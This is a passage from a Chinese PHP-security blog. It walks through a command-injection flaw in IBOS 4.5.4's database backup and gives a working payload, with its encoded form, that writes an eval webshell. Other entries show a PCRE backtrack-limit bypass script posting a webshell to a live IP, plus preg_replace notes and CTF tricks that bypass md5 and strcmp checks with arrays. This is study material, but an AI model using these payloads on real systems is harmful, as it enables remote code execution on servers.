<p>对比ibos4.5.4 system\core\utils\database.php</p>
<p>![image-20220918155833651](IBOS 4.5.4 命令执行分析.assets/2.png)</p>
<p>可以看到shell_exec被删除</p>
<p>全局搜索shell_exec</p>
<p>data\restore.php中</p>
<p>![image-20220918155650432](IBOS 4.5.4 命令执行分析.assets/3.png)</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$mysqlBin</span> <span class="token punctuation">.</span> mysql <span class="token operator">-</span>h <span class="token punctuation">.</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span> <span class="token operator">-</span>P <span class="token number">3306</span> <span class="token operator">-</span>u root <span class="token operator">-</span>p root  ibos <span class="token operator">&lt;</span> <span class="token variable">$file</span><span class="token punctuation">;</span></code></pre>
<ul>
<li>$mysqlBin是上面代码1数据库查询结果</li>
<li>$file来源未知</li>
</ul>
<p>system\core\utils\database.php中</p>
<pre class=" language-php"><code class="language-php"><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">"{$mysqlBin}mysqldump --force --quick $command1 --add-drop-table $command2 $command3 --host=\"{$db["</span>host<span class="token string">"]}\" $command5 --user=\"{$db["</span>username<span class="token string">"]}\" --password=\"{$db["</span>password<span class="token string">"]}\" \"{$db["</span>dbname<span class="token string">"]}\" $tablesstr > $dumpFile"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>mysqldump是MYSQL用于备份数据库的命令，使用如下</p>
<pre class=" language-sql"><code class="language-sql">mysqldump <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> 数据库名 <span class="token punctuation">[</span>表名<span class="token punctuation">]</span> <span class="token operator">></span> 脚本名
mysqldump <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">--数据库名 [选项 表名] > 脚本名</span>
mysqldump <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">--all-databases [选项]  > 脚本名</span></code></pre>
<p>后台存在备份数据库的选项</p>
<p>![image-20220918161732948](IBOS 4.5.4 命令执行分析.assets/4.png)</p>
<p>回到\system\core\utils\Database.php </p>
<pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token punctuation">.</span><span class="token variable">$dumpFile</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token constant">PATH_ROOT</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$backupFileName</span> <span class="token punctuation">.</span> <span class="token string">'.sql'</span><span class="token punctuation">;</span>
<span class="token number">2</span><span class="token punctuation">.</span><span class="token variable">$backupFileName</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">BACKUP_DIR</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">3</span><span class="token punctuation">.</span><span class="token variable">$fileName</span> <span class="token operator">=</span> Env<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以看到，这两个就是$filename</p>
<p>![img](IBOS 4.5.4 命令执行分析.assets/5.png)</p>
<p>但是，$backupFileName会把filename中的<code>/ \ .</code>替换为空</p>
<p>利用windows的环境变量来绕过</p>
<p>![image-20220918163758429](IBOS 4.5.4 命令执行分析.assets/6.png)</p>
<pre><code>1&amp;echo "&lt;?php @eval($_POST['a']);?&gt;" &gt; a%PATHEXT:~0,1%php&amp;1</code></pre>
<p>还要对其进行编码，因为post数据会把&amp;当作多个参数</p>
<pre><code>111%26echo%20%22%3C%3Fphp%20%40eval(%24_POST%5B'a'%5D)%3B%3F%3E%22%20%3E%20a%25PATHEXT%3A~0%2C1%25php%26111</code></pre>
<p>![image-20220918165303689](IBOS 4.5.4 命令执行分析.assets/7.png)</p>
<p>发包就可在根目录写入a.php</p>
]]></content>
      <tags>
        <tag>PHPsec</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP preg_match()</title>
    <url>/2021/09/12/phpsec/php-preg-match/php-preg-match/</url>
    <content><![CDATA[<h3 id="1、数组绕过"><a href="#1、数组绕过" class="headerlink" title="1、数组绕过"></a>1、数组绕过</h3><p>preg_match只能处理字符串，当传入的subject是数组时会返回false</p>
<h3 id="2、PCRE回溯次数限制"><a href="#2、PCRE回溯次数限制" class="headerlink" title="2、PCRE回溯次数限制"></a>2、PCRE回溯次数限制</h3><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO

files <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span>b<span class="token string">'aaa&lt;?php eval($_POST[txt]);//'</span> <span class="token operator">+</span> b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">1000000</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://51.158.75.42:8088/index.php'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>headers<span class="token punctuation">)</span></code></pre>
<p><code>pcre.backtrack_limit</code>给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false</p>
<p><code>.</code>不会匹配换行符，如</p>
<h3 id="3、换行符"><a href="#3、换行符" class="headerlink" title="3、换行符"></a>3、换行符</h3><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^.*(flag).*$/'</span><span class="token punctuation">,</span> <span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>只需要</p>
<pre><code>$json="\nflag"</code></pre>
<p>而在非多行模式下，<code>$</code>似乎会忽略在句尾的<code>%0a</code></p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^flag$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>只需要传入</p>
<pre><code>?a=flag%0a</code></pre>
<p>原文：<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p>
]]></content>
      <tags>
        <tag>PHPsec</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP preg_replace()</title>
    <url>/2021/06/21/phpsec/php-preg-replace/php-preg-replace/</url>
    <content><![CDATA[<p><a href="https://www.cnblogs.com/crxis/p/7714636.html">https://www.cnblogs.com/crxis/p/7714636.html</a></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"as2223adfsf0s4df0sdfsdf"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/0/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去掉0字符，此时相当于 replace的功能, preg_replace("/0/","A",$str); 这样就是将0变成A的意思了</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[0-9]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去掉所有数字</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[a-z]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这样是去掉所有小写字母</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[A-Z]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这样是去掉所有大写字母</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[a-z,A-Z]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这样是去掉所有字母</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"as2223adfsAAf0s4df0s中国人dD中南海DDfsdf"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[a-z,A-Z,0-9]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//去掉所有字母和数字</span>
<span class="token delimiter">?></span>
经过以上的例子，相信大家知道，<span class="token punctuation">[</span> <span class="token punctuation">]</span> 和里面的<span class="token punctuation">,</span>有什么作用了。也可以看到，匹配的字符串必须加 <span class="token operator">/</span> <span class="token operator">/</span>（看例子的第一个参数）

<span class="token delimiter">&lt;?php</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"acsdcs&lt;55555555>sc&lt;6666>sdcd"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;.*>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//这个是表示去除以&lt;开头，以>结尾的那部份，输出结果是：acsdcssdcd</span>
注意：上面的 <span class="token punctuation">.</span><span class="token operator">*</span> 是表示任何字符，也就是说不管<span class="token operator">&lt;</span><span class="token operator">></span>包住的是什么都去掉其中<span class="token punctuation">.</span> 表示任意字符， <span class="token operator">*</span> 表示任意个数

现在我们来改动一下，如果不想是任何个数呢？
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"acsdcs&lt;55555555>sc&lt;6666>sdcd"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;.{4}>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//此时输出：acsdcs&lt;55555555>scsdcd因为{4}指定了条件：&lt;>内为4个字符的才满足条件，所以&lt;55555555>不符合条件，没有被替换。</span>

注意：这时我们又学到了一个知识点<span class="token punctuation">{</span>数字<span class="token punctuation">}</span> 表示指定前面的个数，<span class="token operator">*</span>就表示是任意个<span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">--</span>无限个<span class="token punctuation">)</span>

表示重复次数的除了 <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>指定次数<span class="token punctuation">}</span> 表示，还有很多表达形式：



<span class="token delimiter">&lt;?php</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"acsdcs&lt;55555555>sc&lt;6666>sd&lt;>cd"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;[0-9]*>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//输出acsdcscd</span>
<span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;[0-9]+>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//输入acsdcsscsd&lt;>cd</span>
<span class="token delimiter">?></span>

上面的例子只要是为了 表达 <span class="token operator">*</span> 与<span class="token operator">+</span>的区别 <span class="token punctuation">,</span><span class="token operator">*</span> 表示重复<span class="token number">0</span>数或n 次，而<span class="token operator">+</span> 表示<span class="token number">1</span>次以上，即一例中<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>[0-9]+</span> <span class="token punctuation">></span></span></span>表示<span class="token operator">&lt;</span><span class="token operator">></span>里面至少要有一个数字才符合条件。

相信这时大家知道，为什么上例中用<span class="token operator">*</span> 和用<span class="token operator">+</span>输出的结果不同了吧

再来：

<span class="token delimiter">&lt;?php</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"acsdcs&lt;55555555>sc&lt;6666>sd&lt;>cd"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;[0-9]?>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//输出acsdcs&lt;55555555>sc&lt;6666>sdcd</span>
<span class="token delimiter">?></span>

看<span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">?</span> 这里的<span class="token operator">?</span>表示要是<span class="token number">0</span>次或<span class="token number">1</span> 次，超过<span class="token number">1</span>次又不符合条件了。
总结一下，上面我们学会了 <span class="token operator">*</span> <span class="token operator">+</span> <span class="token operator">?</span> 和大括号<span class="token punctuation">{</span><span class="token punctuation">}</span>表示重复次数的方法。

<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>

    <span class="token variable">$s</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/（.*?[月票|求|更].*?）/i"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">preg_match_all</span><span class="token punctuation">(</span>'<span class="token operator">/</span>href<span class="token operator">=</span>\<span class="token string">"([0-9]+)\.shtm"</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token markup">&lt;\/a></span><span class="token operator">/</span>i'<span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">,</span><span class="token variable">$arr_dstorycate</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr_dstorycate</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>

   <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/&lt;img.*?src=[\\\'| \\\"](.*?(?:[\.gif|\.jpg]))[\\\'|\\\"].*?[\/]?>/i"</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$arr_dstorycate</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            
   <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr_dstorycate</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>
<p> 补充：</p>
<p>.$pattern是数组,$replace也是数组,则中对应的 元素进行替换</p>
<p>php</p>
<p>preg_replace有五个参数,有三个是必须参数</p>
<p>Preg_replace(mixed $pattern, mixed $replacement, mixed $subject [,int $limit = -1 [,int $count ]]); </p>
<p>$pattern 可以是字符串,字符串数组,或者preg</p>
<p>$replace 是用于替换的字符串或字符串数组</p>
<p>$subject 目标字符串或者目标字符串数组</p>
<p>$limit 每个模式在每个$subject上最大的替换次数,默认是-1(无限次)</p>
<p>$count 返回在目标字符串所替换的次数</p>
<p>在repalce与pattern中有几点要注意的</p>
<p>1.$pattern是数组,$replace也是字符串,那么所有模式都使用这个字符串来匹配;</p>
<p><img src="/2021/06/21/phpsec/php-preg-replace/php-preg-replace/1.png" alt="1"></p>
<p>2.$pattern是数组,$replace也是数组,则中对应的 元素进行替换</p>
<p><img src="/2021/06/21/phpsec/php-preg-replace/php-preg-replace/2.png" alt="2"></p>
<p>3.如果数组$pattern大于$replace,则多出来的$pattern用空的字符串进行替换,</p>
<p><img src="/2021/06/21/phpsec/php-preg-replace/php-preg-replace/3.png" alt="3"></p>
<p>$replace少于$patterns,则匹配到的值全部用空字符串来替换</p>
<p>4.对于上面例子中出现的${1},${2},${3},这个叫做包含后向引用,里面的数字代表原子出现的位数,有两种写法,一种是\n,一种是${n},推荐使用第二种写法.会把目标字符串匹配到的pattern中的原子,按照要求变化目标字符串的格式,或者匹配的原子原样输出(这里举两个例子)</p>
<p><img src="/2021/06/21/phpsec/php-preg-replace/php-preg-replace/4.png" alt="4"></p>
<p> 把时间按照 下划线分割开来,${3}就是匹配的到$patterns中的第三个原子((\d{1,2})),${4}就是匹配的到$patterns中的第四个原子((\d{1,2}))以此类推,</p>
<p><img src="/2021/06/21/phpsec/php-preg-replace/php-preg-replace/5.png" alt="5"></p>
<p>例如大家熟悉的smarty模板引擎中编译后替换的方法</p>
<p>5.第四个参数的$limit的使用,第四个参数的意思是每个模式在每个subject上进行替换的最大次数</p>
<p><img src="/2021/06/21/phpsec/php-preg-replace/php-preg-replace/6.png" alt="6"></p>
<p>如果limit为n,它只用正则替换n次</p>
<p>6.第五个参数$count的使用,$count的意思是,subject目标字符串被替换的次数,拿第五点的例子来说</p>
<p><img src="/2021/06/21/phpsec/php-preg-replace/php-preg-replace/7.png" alt="7"></p>
<p>上面代码中的例子运行结果如下:</p>
<p><img src="/2021/06/21/phpsec/php-preg-replace/php-preg-replace/8.png" alt="8"></p>
<p>ps:</p>
<p>preg_replace与str_replace的关系是什么呢?</p>
<p>我们可以理解为str_replace是preg_repalce的一个子集.只是str_replace中的第一个参数写的是string,而preg_replace写的是一个正则表达式</p>
<h1 id="PHP正则表达式修饰符的理解："><a href="#PHP正则表达式修饰符的理解：" class="headerlink" title="PHP正则表达式修饰符的理解："></a><strong>PHP正则表达式修饰符的理解</strong>：</h1><p>​    在PHP正则表达式里面的修饰符可以改变正则的很多特性，使得正则表达式更加适合你的需要（注意：修饰符对于大小写是敏感的，这意味着”e”并不等于”E”）。</p>
<p>​    PHP正则表达式修饰符的种类及介绍：</p>
<p>​    ◆i ：如果在修饰符中加上”i”，则正则将会取消大小写敏感性，即”a”和”A” 是一样的。</p>
<p>​    ◆m：默认的正则开始”^”和结束”$”只是对于正则字符串如果在修饰符中加上”m”，那么开始和结束将会指字符串的每一行：每一行的开头就是”^”，结尾就是”$”。</p>
<p>​    ◆s：如果在修饰符中加入”s”，那么默认的”.”代表除了换行符以外的任何字符将会变成任意字符，也就是包括换行符！</p>
<p>​    ◆x：如果加上该修饰符，表达式中的空白字符将会被忽略，除非它已经被转义。</p>
<p>​    ◆e：本修饰符仅仅对于replacement有用，代表在replacement中作为PHP代码。</p>
<p>​    ◆A：如果使用这个修饰符，那么表达式必须是匹配的字符串中的开头部分。比如说”/a/A”匹配”abcd”。</p>
<p>​    ◆E：与”m”相反，如果使用这个修饰符，那么”$”将匹配绝对字符串的结尾，而不是换行符前面，默认就打开了这个模式。</p>
<p>​    ◆U：和问号的作用差不多，用于设置”贪婪模式”。</p>
]]></content>
      <tags>
        <tag>PHPsec</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 数组绕过学习</title>
    <url>/2021/09/13/phpsec/php-shu-zu-rao-guo-xue-xi/php-shu-zu-rao-guo-xue-xi/</url>
    <content><![CDATA[<h3 id="1、数组绕过MD5判断"><a href="#1、数组绕过MD5判断" class="headerlink" title="1、数组绕过MD5判断"></a>1、数组绕过MD5判断</h3><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">else</span>
<span class="token keyword">print</span> <span class="token string">'Wrong.'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/6952387-f377013e6573e356.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/623" alt="img"></p>
<p>如果传入md5函数的参数为数组类型，则返回null，<code>null===null</code>，因此可以通过数组可以绕过 <code>===</code> md5判断</p>
<h3 id="2、数组绕过strcmp"><a href="#2、数组绕过strcmp" class="headerlink" title="2、数组绕过strcmp"></a>2、数组绕过strcmp</h3><pre class=" language-php"><code class="language-php"><span class="token variable">$pass</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$pass1</span><span class="token operator">=</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//被隐藏起来的密码</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span><span class="token variable">$pass1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token keyword">echo</span> <span class="token string">"flag:nctf{*}"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
<span class="token keyword">echo</span> <span class="token string">"the pass is wrong!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
<span class="token keyword">echo</span> <span class="token string">"please input pass!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<blockquote>
<p>strcmp函数用于字符串的比较</p>
<pre><code>int strcmp ( string $str1 , string $str2 )</code></pre>
<p>返回值：如果 <code>str1</code> 小于 <code>str2</code> 返回 &lt; 0； 如果 <code>str1</code> 大于 <code>str2</code> 返回 &gt; 0；如果两者相等，返回 0。</p>
<ul>
<li>5.2 中是将两个参数先转换成string类型。</li>
<li>5.3.3 以后，当比较数组和字符串的时候，返回是0。</li>
<li>5.5 中如果参数不是string类型，直接return了</li>
</ul>
<p>存在以下情况</p>
</blockquote>
<pre class=" language-php"><code class="language-php"><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span> <span class="token operator">+</span> <span class="token constant">PHP</span> Warning

<span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">stdClass</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span> <span class="token operator">+</span> <span class="token constant">PHP</span> Warning

<span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span> <span class="token operator">+</span> <span class="token constant">PHP</span> Warning</code></pre>
<p>因此post提交pass[]=aa，通过数组绕过strcmp。</p>
<h3 id="3、数组绕过ereg"><a href="#3、数组绕过ereg" class="headerlink" title="3、数组绕过ereg"></a>3、数组绕过ereg</h3><pre class=" language-php"><code class="language-php">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'nctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
